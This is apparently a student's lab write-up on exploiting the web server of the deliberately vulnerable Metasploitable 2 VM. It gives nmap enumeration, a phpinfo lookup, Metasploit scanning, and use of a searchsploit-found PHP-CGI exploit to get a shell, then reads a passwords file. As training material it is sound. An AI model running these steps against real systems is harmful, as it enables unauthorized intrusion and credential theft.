<h1>Metasploitable 2 Website Hacking</h1>

<h2>Description</h2>

The project consists of using the information from the [enumeration project](https://github.com/ntieu4328/Metasploit-2-Enumeration) to start exploiting the Metasploitable 2 system. In this project, I will specifically exploit the website portion of the Metasploitable 2 system.

<h2>Walk-through:</h2>

From the enumeration that was done, I can see that port 80 is open:

![nmap_LI](https://github.com/ntieu4328/Metasploitable-2-Website-Hacking/assets/156137990/ea2efe3d-e993-4d0d-be56-c34ece7b27e4)

This port is the default port used for HTTP. HTTP is used for unencrypted web pages. HTTPS, which is run on port 443, is used for encrypted web pages.

We can look at the web page by inputting the IP into a web browser:

![metasploitable website](https://github.com/ntieu4328/Metasploitable-2-Website-Hacking/assets/156137990/837fb511-bb84-4078-b85b-da9d884f63a7)

<h3>Web developer tools</h3>

One way to gather more information would be to go into web developer tools:

![start web developer tools](https://github.com/ntieu4328/Metasploitable-2-Website-Hacking/assets/156137990/a668da39-43d8-42da-a798-7b402cce102f)

Look at the website header:

![headers show server and what's running](https://github.com/ntieu4328/Metasploitable-2-Website-Hacking/assets/156137990/de0db523-4e9e-453d-a083-767abfd396e0)

Server: Apache/2.2.8 (Ubuntu) DAV/2
Powered By: PHP/5.2.4-2ubuntu5.10
Both are out of date, so we can look up vulnerabilities to see if we can exploit them.

<h3>HTTP enum script</h3>

We can also run a script to see what directories are available on the website:

*This script will only work with http websites

```bash
nmap -sV -p 80 --script http-enum 10.0.2.4
```
![http enumeration metasploitable home page](https://github.com/ntieu4328/Metasploitable-2-Website-Hacking/assets/156137990/9f12ec06-19f4-4176-a652-110a9fa4e2d5)

After looking through the directories, one of the interesting directories I found was phpinfo.php. I accessed it by searching:

http://10.0.2.4/phpinfo.php/

![phpinfo php](https://github.com/ntieu4328/Metasploitable-2-Website-Hacking/assets/156137990/d7b82c30-b704-430b-9c10-7c8d39d60f88)

This page shows a lot of information about the system, which we can use to exploit the website.
</br>

<h3>Metasploit</h3>

Metasploit is a penetration testing framework. We are going to use Metasploit to find a vulnerability in the http version that Metasploitable 2 is running.

Start Metasploit:

```bash
msfconsole
```

![metasploit start](https://github.com/ntieu4328/Metasploitable-2-Website-Hacking/assets/156137990/18449075-6d98-4bbb-aa8e-f01265a629be)

Scan for the http version of Metasploitable 2:

  1. Choose the scanner that looks for the http version:
     
```bash
search http_version
```
    
  ![http version scan](https://github.com/ntieu4328/Metasploitable-2-Website-Hacking/assets/156137990/285b664e-bed6-4bf4-9130-240628b041c3)

  2. The module that we want to use is #0:
     
```bash
use 0
```

  3. The scan needs some configuration, so we have to see what we need to configure:

```bash
show options
```
    
  ![scan show options](https://github.com/ntieu4328/Metasploitable-2-Website-Hacking/assets/156137990/92808d81-f524-4d47-91d5-15652274991f)
  
    The RHOSTS option hasn't been configured.

  4. Configure RHOSTS with the target IP:
     
```bash
set rhosts 10.0.2.4
```

  5. Start the scan:
     
```bash
exploit
```

  ![scan results](https://github.com/ntieu4328/Metasploitable-2-Website-Hacking/assets/156137990/b573a877-81b7-433a-a5f5-079d080b0a58)

  6. Look for any vulnerabilities that can be done on the version of Apache using PHP using searchsploit:
     
```bash
searchsploit apache 2.2.8 | grep php
```

*Searchsploit looks for vulnerabilities with Apache 2.2.8. The results are piped to grep which looks for results specifically with php.

![scan results](https://github.com/ntieu4328/Metasploitable-2-Website-Hacking/assets/156137990/9a1eed70-db4d-4f78-9491-a10a431a73e2)

  7. Search for the first exploit shown:

```bash
grep cgi search php
```

![cgi exploit](https://github.com/ntieu4328/Metasploitable-2-Website-Hacking/assets/156137990/d5cab748-b4f8-4af9-8517-dc1d3a857134)

The exploit that we were looking for is #258.

  8. Select the exploit:

```bash
use 258
```

  9. The exploit needs to be configured:

```bash
show options
```

![exploit options](https://github.com/ntieu4328/Metasploitable-2-Website-Hacking/assets/156137990/b87b217c-cffd-4da8-968d-a830254f890a)

The RHOSTS option hasn't been configured.

  10. Configure RHOSTS with the target IP:
     
```bash
set rhosts 10.0.2.4
```

  11. Start the exploit:

```bash
run
```

![start exploitation](https://github.com/ntieu4328/Metasploitable-2-Website-Hacking/assets/156137990/82db04fd-b71b-4fb4-a2d4-77b6b3e96eeb)

<b>I now have full access to the system!!!</b>

Some interesting files that I found was in the Mutillidae directory. I went into the directory using:

```bash
cd mutillidae
```

![interesting files](https://github.com/ntieu4328/Metasploitable-2-Website-Hacking/assets/156137990/6e10436f-cf5a-422c-a53d-894bc9a336bc)

Read the robots.txt file:

The robots.txt file is used to specify files and directories that the web admin doesn't want you to be able to search in the web browser.

```bash
cat robots.txt
```

![robots](https://github.com/ntieu4328/Metasploitable-2-Website-Hacking/assets/156137990/adfeeb54-bece-4296-b04f-2fa59d8d7cea)

We can also go into the passwords directory and read the file that is on it:

```bash
cd passwords
ls
cat accounts.txt
```

![passwords](https://github.com/ntieu4328/Metasploitable-2-Website-Hacking/assets/156137990/5c3ec251-0e59-4c45-8b3f-26862e89b354)

<b>There are some passwords that are listed!!!</b>
